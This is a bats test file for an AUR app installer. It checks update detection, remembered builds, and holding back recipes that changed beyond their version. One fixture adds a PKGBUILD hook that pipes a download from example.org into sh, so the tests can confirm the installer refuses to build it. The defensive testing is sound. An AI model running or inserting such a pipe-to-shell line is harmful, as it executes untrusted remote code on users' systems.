#!/usr/bin/env bats

# nova apps install against a stubbed AUR, pacman and makepkg, with each
# recipe's history a real git repository: what it builds in each mode, which
# changes to a recipe it builds unasked, and what it says.

load ../test_helper

setup() {
  setup_scratch
  export CALLS="$SCRATCH/calls" INSTALLED="$SCRATCH/installed" AUR_JSON="$SCRATCH/aur.json"
  export NOVA_AUR="$SCRATCH/aur" NOVA_AUR_STATE="$SCRATCH/state"
  export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null
  export GIT_AUTHOR_NAME=AUR GIT_AUTHOR_EMAIL=aur@example.org GIT_COMMITTER_NAME=AUR GIT_COMMITTER_EMAIL=aur@example.org
  mkdir -p "$SCRATCH/bin"
  : >"$INSTALLED"
  aur google-chrome 142.0-1 visual-studio-code-bin 1.142.0-1
  recipe google-chrome 141.0
  recipe google-chrome 142.0
  recipe visual-studio-code-bin 1.141.0
  recipe visual-studio-code-bin 1.142.0
  stub curl '[[ -s $AUR_JSON ]] || exit 7; cat "$AUR_JSON"'
  stub pacman '[[ $1 == -Q ]] || exit 1; grep "^$2 " "$INSTALLED" || exit 1'
  stub makepkg 'echo "built ${PWD##*/}" >>"$CALLS"'
  # Every repository's package list is there, unless a test removes one.
  export SYNC="$SCRATCH/db"
  mkdir -p "$SYNC/sync"
  touch "$SYNC/sync/nova.db" "$SYNC/sync/core.db" "$SYNC/sync/extra.db"
  stub pacman-conf 'case $1 in DBPath) echo "$SYNC/" ;; --repo-list) printf "%s\n" nova core extra ;; esac'
  stub sudo 'echo "sudo $*" >>"$CALLS"'
  export PATH="$SCRATCH/bin:$PATH"
}

teardown() { teardown_scratch; }

stub() { # name body
  printf '#!/bin/bash\n%s\n' "$2" >"$SCRATCH/bin/$1"
  chmod +x "$SCRATCH/bin/$1"
}

aur() { # name version...: what the AUR answers
  local results=()
  while (($# > 0)); do results+=("{\"Name\":\"$1\",\"Version\":\"$2\"}"); shift 2; done
  printf '{"results":[%s]}' "$(IFS=,; echo "${results[*]}")" >"$AUR_JSON"
}

# A commit to the app's AUR repository: its recipe at this version, with any
# further lines added to the PKGBUILD.
recipe() { # app version [line...]
  local repo=$NOVA_AUR/$1.git version=$2 sum
  shift 2
  [[ -d $repo ]] || git init -q -b master "$repo"
  sum=$(printf '%s' "$version" | sha256sum | cut -d ' ' -f 1)
  {
    printf 'pkgname=%s\npkgver=%s\npkgrel=1\n' "${repo##*/}" "$version"
    printf "sha256sums=('%s'\n            '%s')\n" "$sum" "$sum"
    printf 'package() {\n  bsdtar -xf data.tar.xz -C "$pkgdir/"\n}\n'
    (($# == 0)) || printf '%s\n' "$@"
  } >"$repo/PKGBUILD"
  printf 'pkgbase = %s\n\tpkgver = %s\n\tpkgrel = 1\n' "${repo##*/}" "$version" >"$repo/.SRCINFO"
  git -C "$repo" add -A
  git -C "$repo" commit -qm "upgpkg: $version"
}

apps() { "$REPO_ROOT/src/cli/bin/nova-apps-install" "$@"; }
built() { cat "$CALLS" 2>/dev/null | paste -sd' '; }

@test "--check names the installed apps that are behind" {
  echo "google-chrome 141.0-1" >>"$INSTALLED"
  echo "visual-studio-code-bin 1.142.0-1" >>"$INSTALLED"
  run apps --check
  [ "$status" -eq 0 ]
  [ "$output" = "apps google-chrome" ]
  [ -z "$(built)" ]
}

@test "--check says current when nothing installed is behind, missing ones aside" {
  echo "google-chrome 142.0-1" >>"$INSTALLED"
  run apps --check
  [ "$output" = current ]
}

@test "--check without the AUR says nothing and fails" {
  : >"$AUR_JSON"
  run apps --check
  [ "$status" -ne 0 ]
  [ -z "$output" ]
}

@test "--list names the apps, asking nothing of the AUR" {
  : >"$AUR_JSON"
  run apps --list
  [ "$status" -eq 0 ]
  [ "$output" = "google-chrome
visual-studio-code-bin" ]
  [ -z "$(built)" ]
}

@test "--update rebuilds what is behind and installs nothing new" {
  echo "google-chrome 141.0-1" >>"$INSTALLED"
  run apps --update --noconfirm
  [ "$status" -eq 0 ]
  [ "$(built)" = "built google-chrome" ]
  [[ $output == *"google-chrome 141.0-1 -> 142.0-1"* ]]
}

@test "a plain install adds what is missing and updates what is behind" {
  echo "visual-studio-code-bin 1.141.0-1" >>"$INSTALLED"
  run apps --noconfirm
  [ "$status" -eq 0 ]
  [ "$(built)" = "built google-chrome built visual-studio-code-bin" ]
}

@test "up to date, nothing is built" {
  echo "google-chrome 142.0-1" >>"$INSTALLED"
  echo "visual-studio-code-bin 1.142.0-1" >>"$INSTALLED"
  run apps
  [ "$status" -eq 0 ]
  [ -z "$(built)" ]
  [[ $output == *"google-chrome is up to date (142.0-1)"* ]]
}

@test "without the AUR's versions, missing apps are still installed and the rest left alone" {
  : >"$AUR_JSON"
  echo "google-chrome 141.0-1" >>"$INSTALLED"
  run apps --noconfirm
  [ "$status" -eq 0 ]
  [ "$(built)" = "built visual-studio-code-bin" ]
  [[ $output == *"the AUR did not answer"* ]]
}

@test "a build that fails is named, and fails the run" {
  stub makepkg 'exit 1'
  run apps --noconfirm
  [ "$status" -eq 1 ]
  [[ $output == *"could not build google-chrome visual-studio-code-bin"* ]]
}

@test "a system without its repositories' package lists reads them once first" {
  rm "$SYNC/sync/core.db" "$SYNC/sync/extra.db"
  run apps --noconfirm
  [ "$status" -eq 0 ]
  [ "$(built)" = "sudo pacman -Sy --noconfirm built google-chrome built visual-studio-code-bin" ]
}

@test "with every package list there, nothing is read before building" {
  run apps
  [ "$status" -eq 0 ]
  [ "$(built)" = "built google-chrome built visual-studio-code-bin" ]
}

@test "the first build of an app is remembered, and a new version alone builds unasked" {
  run apps --noconfirm
  [ "$status" -eq 0 ]
  [[ $output == *"google-chrome: built for the first time here"* ]]
  [ "$(cat "$NOVA_AUR_STATE/google-chrome")" = "$(git -C "$NOVA_AUR/google-chrome.git" rev-parse HEAD)" ]
  echo "google-chrome 142.0-1" >"$INSTALLED"
  echo "visual-studio-code-bin 1.142.0-1" >>"$INSTALLED"
  aur google-chrome 143.0-1 visual-studio-code-bin 1.142.0-1
  recipe google-chrome 143.0
  : >"$CALLS"
  run apps --update --noconfirm
  [ "$status" -eq 0 ]
  [ "$(built)" = "built google-chrome" ]
  [ "$(cat "$NOVA_AUR_STATE/google-chrome")" = "$(git -C "$NOVA_AUR/google-chrome.git" rev-parse HEAD)" ]
}

@test "a recipe that changed more than its version waits under --noconfirm" {
  echo "google-chrome 141.0-1" >>"$INSTALLED"
  recipe google-chrome 142.0 'post_install() { curl -s https://example.org/x | sh; }'
  run apps --update --noconfirm
  [ "$status" -eq 1 ]
  [ -z "$(built)" ]
  [[ $output == *"google-chrome: its AUR recipe changed more than the version"* ]]
  [[ $output == *"Run nova apps update in a terminal"* ]]
  [ ! -e "$NOVA_AUR_STATE/google-chrome" ]
}

@test "a change made after the installed version came out counts, though it kept the version" {
  # 142.0 is installed; a later commit at 142.0 changed the recipe, then 143.0
  # came: what is compared starts where 142.0 did.
  echo "google-chrome 142.0-1" >>"$INSTALLED"
  recipe google-chrome 142.0 'echo hello'
  recipe google-chrome 143.0 'echo hello'
  aur google-chrome 143.0-1 visual-studio-code-bin 1.142.0-1
  run apps --update --noconfirm
  [ "$status" -eq 1 ]
  [ -z "$(built)" ]
  [[ $output == *"google-chrome: its AUR recipe changed more than the version"* ]]
}

@test "a file other than the PKGBUILD that changed waits too, a binary one as well" {
  echo "google-chrome 141.0-1" >>"$INSTALLED"
  printf '\0\1\2' >"$NOVA_AUR/google-chrome.git/blob"
  recipe google-chrome 142.0
  run apps --update --noconfirm
  [ "$status" -eq 1 ]
  [ -z "$(built)" ]
  [[ $output == *"google-chrome: its AUR recipe changed more than the version"* ]]
}

@test "only .SRCINFO changing beyond the version is no change to what runs" {
  echo "google-chrome 141.0-1" >>"$INSTALLED"
  printf 'pkgdesc = something else\n' >>"$NOVA_AUR/google-chrome.git/.SRCINFO"
  git -C "$NOVA_AUR/google-chrome.git" commit -qam "describe it"
  run apps --update --noconfirm
  [ "$status" -eq 0 ]
  [ "$(built)" = "built google-chrome" ]
}

@test "a recipe whose history no longer has what was built here is all new" {
  echo "google-chrome 141.0-1" >>"$INSTALLED"
  mkdir -p "$NOVA_AUR_STATE"
  echo 0123456789abcdef0123456789abcdef01234567 >"$NOVA_AUR_STATE/google-chrome"
  run apps --update --noconfirm
  [ "$status" -eq 1 ]
  [ -z "$(built)" ]
  [[ $output == *"google-chrome: its AUR recipe changed more than the version"* ]]
}

@test "asked, the change is shown, and built only on a yes" {
  echo "google-chrome 141.0-1" >>"$INSTALLED"
  recipe google-chrome 142.0 'post_install() { echo installed; }'
  run bash -c 'printf "n\n" | "$1" --update' _ "$REPO_ROOT/src/cli/bin/nova-apps-install"
  [ "$status" -eq 1 ]
  [[ $output == *"+post_install() { echo installed; }"* ]]
  [[ $output == *"upgpkg: 142.0"* ]]
  [ -z "$(built)" ]
  run bash -c '"$1" --update </dev/null' _ "$REPO_ROOT/src/cli/bin/nova-apps-install"
  [ "$status" -eq 1 ]
  [ -z "$(built)" ]
  run bash -c 'printf "y\n" | "$1" --update' _ "$REPO_ROOT/src/cli/bin/nova-apps-install"
  [ "$status" -eq 0 ]
  [ "$(built)" = "built google-chrome" ]
  [ "$(cat "$NOVA_AUR_STATE/google-chrome")" = "$(git -C "$NOVA_AUR/google-chrome.git" rev-parse HEAD)" ]
}
